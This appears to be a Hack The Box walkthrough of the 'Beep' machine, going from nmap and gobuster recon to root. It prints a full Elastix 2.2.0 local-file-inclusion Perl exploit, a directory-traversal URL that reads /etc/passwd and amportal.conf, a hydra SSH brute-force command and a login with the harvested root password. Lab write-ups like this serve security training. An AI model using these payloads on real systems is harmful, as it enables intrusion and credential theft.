# Beep Walkthrough

![beep](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Beep/beep.png)

## Let's first fast scan out machine using nmap.

```
sudo nmap -F -sV 10.10.10.7
```

### Result

```
PORT      STATE SERVICE    VERSION 
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0) 
25/tcp    open  smtp       Postfix smtpd 
80/tcp    open  http       Apache httpd 2.2.3 
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 
111/tcp   open  rpcbind    2 (RPC #100000) 
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 
443/tcp   open  ssl/https? 
993/tcp   open  ssl/imap   Cyrus imapd 
995/tcp   open  pop3       Cyrus pop3d 
3306/tcp  open  mysql      MySQL (unauthorized) 
10000/tcp open  http       MiniServ 1.570 (Webmin httpd) 
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```

## In fast scan we got a lot of ports in result, let's also do a berif scan.

```
sudo nmap -A -O -v --script vuln 10.10.10.7
```

### Result

```
PORT      STATE SERVICE    VERSION 
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:4.3:  
|       SECURITYVULNS:VULN:6657 9.3     https://vulners.com/securityvulns/SECURITYVULNS:VULN:6657 
|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051 
|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924 
|       SECURITYVULNS:VULN:9317 7.5     https://vulners.com/securityvulns/SECURITYVULNS:VULN:9317 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/      7.5     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2010-4478/     *EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-ELSA-2008-0855/    7.5     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-ELSA-2008-0855/  *
EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/ 7.5     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/
*EXPLOIT* 
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478 
|       CVE-2007-4752   7.5     https://vulners.com/cve/CVE-2007-4752 
|       CVE-2006-5794   7.5     https://vulners.com/cve/CVE-2006-5794 
|       SSV:3188        6.9     https://vulners.com/seebug/SSV:3188     *EXPLOIT* 
|       SECURITYVULNS:VULN:8834 6.9     https://vulners.com/securityvulns/SECURITYVULNS:VULN:8834 
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT* 
|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT* 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107 
|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243 
|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052 
|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT* 
|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT* 
|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37
EF6DBC0B05FBC3  *EXPLOIT* 
|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT* 
|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537 
|       MSF:ILITIES/SUSE-CVE-2011-5000/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2011-5000/  *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2012-0814/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2012-99/      3.5     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-AL
AS-2012-99/     *EXPLOIT* 
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814 
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000 
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327 
|       MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/  1.2     https://vulners.com/metasploit/MSF:ILI
TIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/ *EXPLOIT* 
|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259 
|_      SECURITYVULNS:VULN:9830 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:9830 
25/tcp    open  smtp       Postfix smtpd 
| smtp-vuln-cve2010-4344:  
|_  The SMTP server is not Exim: NOT VULNERABLE 
80/tcp    open  http       Apache httpd 2.2.3 
| http-enum:  
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)' 
|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug) 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_      http://ha.ckers.org/slowloris/ 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-server-header: Apache/2.2.3 (CentOS) 
|_http-trace: TRACE is enabled 
|_http-passwd: ERROR: Script execution failed (use -d to debug) 
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 
111/tcp   open  rpcbind    2 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2            111/tcp   rpcbind 
|   100000  2            111/udp   rpcbind 
|   100024  1            876/udp   status 
|_  100024  1            879/tcp   status 
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 
443/tcp   open  ssl/https? 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug) 
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug) 
| ssl-dh-params:  
|   VULNERABLE: 
|   Diffie-Hellman Key Exchange Insufficient Group Strength 
|     State: VULNERABLE 
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups 
|       of insufficient strength, especially those using one of a few commonly 
|       shared groups, may be susceptible to passive eavesdropping attacks. 
|     Check results: 
|       WEAK DH GROUP 1 
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA 
|             Modulus Type: Safe prime 
|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus 
|             Modulus Length: 1024 
|             Generator Length: 8 
|             Public Key Length: 1024 
|     References: 
|_      https://weakdh.org 
| ssl-ccs-injection:  
|   VULNERABLE: 
|   SSL/TLS MITM vulnerability (CCS Injection) 
|     State: VULNERABLE 
|     Risk factor: High 
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h 
|       does not properly restrict processing of ChangeCipherSpec messages, 
|       which allows man-in-the-middle attackers to trigger use of a zero 
|       length master key in certain OpenSSL-to-OpenSSL communications, and 
|       consequently hijack sessions or obtain sensitive information, via 
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability. 
|            
|     References: 
|       http://www.openssl.org/news/secadv_20140605.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 
|_      http://www.cvedetails.com/cve/2014-0224 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| ssl-poodle:  
|   VULNERABLE: 
|   SSL POODLE information leak 
|     State: VULNERABLE 
|     IDs:  BID:70574  CVE:CVE-2014-3566 
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other 
|           products, uses nondeterministic CBC padding, which makes it easier 
|           for man-in-the-middle attackers to obtain cleartext data via a 
|           padding-oracle attack, aka the "POODLE" issue. 
|     Disclosure date: 2014-10-14 
|     Check results: 
|       TLS_RSA_WITH_AES_128_CBC_SHA 
|     References: 
|       https://www.openssl.org/~bodo/ssl-poodle.pdf 
|       https://www.imperialviolet.org/2014/10/14/poodle.html 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 
|_      https://www.securityfocus.com/bid/70574 
993/tcp   open  ssl/imap   Cyrus imapd 
|_ssl-ccs-injection: No reply from server (TIMEOUT) 
995/tcp   open  pop3       Cyrus pop3d 
3306/tcp  open  mysql      MySQL (unauthorized) 
|_sslv2-drown: ERROR: Script execution failed (use -d to debug) 
|_rsa-vuln-roca: ERROR: Script execution failed (use -d to debug) 
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug) 
|_ssl-ccs-injection: ERROR: Script execution failed (use -d to debug) 
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug) 
|_ssl-heartbleed: ERROR: Script execution failed (use -d to debug) 
|_ssl-poodle: ERROR: Script execution failed (use -d to debug) 
|_ssl-dh-params: ERROR: Script execution failed (use -d to debug) 
4445/tcp  open  upnotifyp? 
10000/tcp open  http       MiniServ 1.570 (Webmin httpd) 
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug) 
| http-litespeed-sourcecode-download:  
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333) 
| /index.php source code: 
| <h1>Error - Bad Request</h1> 
|_<pre>This web server is running in SSL mode. Try the URL <a href='https://10.10.10.7:10000/'>https://10.10.10.7:10000/</a> i
nstead.<br></pre> 
| http-vuln-cve2006-3392:  
|   VULNERABLE: 
|   Webmin File Disclosure 
|     State: VULNERABLE (Exploitable) 
|     IDs:  CVE:CVE-2006-3392 
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML. 
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences 
|       to bypass the removal of "../" directory traversal sequences. 
|        
|     Disclosure date: 2006-06-29 
|     References: 
|       http://www.exploit-db.com/exploits/1997/ 
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392 
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
| http-phpmyadmin-dir-traversal:  
|   VULNERABLE: 
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion 
|     State: UNKNOWN (unable to test) 
|     IDs:  CVE:CVE-2005-3299 
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to 
include local files via the $__redirect parameter, possibly involving the subform array. 
|        
|     Disclosure date: 2005-10-nil 
|     Extra information: 
|       ../../../../../etc/passwd : 
|   <h1>Error - Bad Request</h1> 
|   <pre>This web server is running in SSL mode. Try the URL <a href='https://10.10.10.7:10000/'>https://10.10.10.7:10000/</a>
 instead.<br></pre> 
|    
|     References: 
|       http://www.exploit-db.com/exploits/1244/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.92%E=4%D=4/4%OT=22%CT=1%CU=42584%PV=Y%DS=2%DC=T%G=Y%TM=624A8B9B 
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=C1%GCD=1%ISR=C3%TI=Z%CI=Z%II=I%TS=A)OPS(O1 
OS:=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW 
OS:7%O6=M505ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R= 
OS:Y%DF=Y%T=40%W=16D0%O=M505NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R 
OS:D=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M505ST11NW7%RD=0%Q 
OS:=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A 
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D 
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL 
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) 
 
Uptime guess: 0.016 days (since Mon Apr  4 11:16:53 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=193 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com 
 
TRACEROUTE (using port 3389/tcp) 
HOP RTT       ADDRESS 
1   156.24 ms 10.10.14.1 
2   156.27 ms 10.10.10.7
```

## Now let's first access http port 80. we got a elastix login form. let's run gobuster for directory enumeration.

```
gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

## Here -k is used for bypassing certificates check

### Result

```
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/] 
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] 
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] 
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/] 
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]    
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]   
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]  
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]    
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]     
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]   
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/] 
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
```

## Now let's do a search about if elastix had any vulnerability 

```
searchsploit elastix
```

### Result

```
Elastix - 'page' Cross-Site Scripting                                                       | php/webapps/38078.py 
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                     | php/webapps/38544.txt 
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                               | php/webapps/34942.txt 
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                            | php/webapps/37637.pl 
Elastix 2.x - Blind SQL Injection                                                           | php/webapps/36305.txt 
Elastix < 2.5 - PHP Code Injection                                                          | php/webapps/38091.php 
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                      | php/webapps/18650.py
```

## We know we can not do XSS because it also need a user interaction, let's try Local file inclusion 

## let's first read the exploit

```
cat /usr/share/exploitdb/exploits/php/webapps/37637.pl
```

### Result

```
source: https://www.securityfocus.com/bid/55078/info 
 
Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. 
 
An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. T
his may aid in further attacks. 
 
Elastix 2.2.0 is vulnerable; other versions may also be affected. 
 
#!/usr/bin/perl -w 
 
#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives, 
#available at an enterprise level, into a unique solution. 
#------------------------------------------------------------------------------------# 
############################################################ 
# Exploit Title: Elastix 2.2.0 LFI 
# Google Dork: :( 
# Author: cheki 
# Version:Elastix 2.2.0 
# Tested on: multiple 
# CVE : notyet 
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes 
# vendor http://www.elastix.org/ 
 
print "\t Elastix 2.2.0 LFI Exploit \n"; 
print "\t code author cheki   \n"; 
print "\t 0day Elastix 2.2.0  \n"; 
print "\t email: anonymous17hacker{}gmail.com \n"; 
 
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action 
 
use LWP::UserAgent; 
print "\n Target: https://ip "; 
chomp(my $target=<STDIN>); 
$dir="vtigercrm"; 
$poc="current_language"; 
$etc="etc"; 
$jump="../../../../../../../..//"; 
$test="amportal.conf%00"; 
 
$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n"; 
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'); 
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action"; 
$res = $code->request(HTTP::Request->new(GET=>$host)); 
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') { 
 
print "\n read amportal.conf file : $answer \n\n"; 
print " successful read\n"; 
 
} 
else { 
print "\n[-] not successful\n";
```

## Here in LFI Exploit it shows a directory name /vtigercrm we also got this directory in our gobuster scan. let's try to access thsi first 

![panel](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Beep/panel.png)

## we got a vitger crm login panel let's use complete exploit. 
## After using complete exploit we got below page.

![page](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Beep/page.png)

## let's view page source of this page 

![source](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Beep/source.png)

## this seems like there is user and password and using same password for multiple services or accounts.

## let's check /etc/passwd file using lfi

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

### Result

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

## After this we have Possible Valid Users:

### root
### asterisk
### admin
### asteriskuser
### cyrus
### fanis
### spamfilter
### mysql

## Possible Valid Passwords:

### jEhdIekWmdjE
### amp109


## Save this user name and passwords on different file. Now let's use hydra for bruteforcing ssh service.

```
hydra -L User-file -P password-file ssh://10.10.10.7
```

### Result

```
[DATA] attacking ssh://10.10.10.7:22/ 
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE 
1 of 1 target successfully completed, 1 valid password found
```

## we got username and password let's login ssh using this credentials

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```

# BOOMMM!!! WE GOT ROOT SHELL .

![root](https://c.tenor.com/8lniXuMtBREAAAAd/dance-happy.gif)
